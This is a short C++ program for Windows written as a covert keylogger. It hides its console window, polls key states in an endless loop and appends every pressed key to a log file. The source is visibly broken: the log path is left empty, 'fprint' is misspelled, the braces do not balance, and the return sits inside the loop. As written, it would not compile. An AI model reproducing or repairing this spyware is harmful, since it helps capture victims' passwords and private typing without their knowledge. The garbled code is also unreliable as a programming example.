#include <cstdlib>
#include <iostream>
#include <cstdio>
#include <windows.h>
#include <fstream>
#define DELAY 150

using namespace std;

void writedown (char key){
    
	/*save file */char *path =   ;
	FILE *out;
	out = fopen(path, "a+");
	fprint(out , "%c", key);
	fclose(out);
}
int main()
{
	FreeConsole();
	while(true) {
	for (char i = 31; i < 91; i++) {
	if(GetAsyncKeyState(i)  != NULL){
	    writedown(i);
	    Sleep(DELAY);
	}
	}  
	
	cin.get();
	cin.get();
	return EXIT_SUCCESS;
	
}
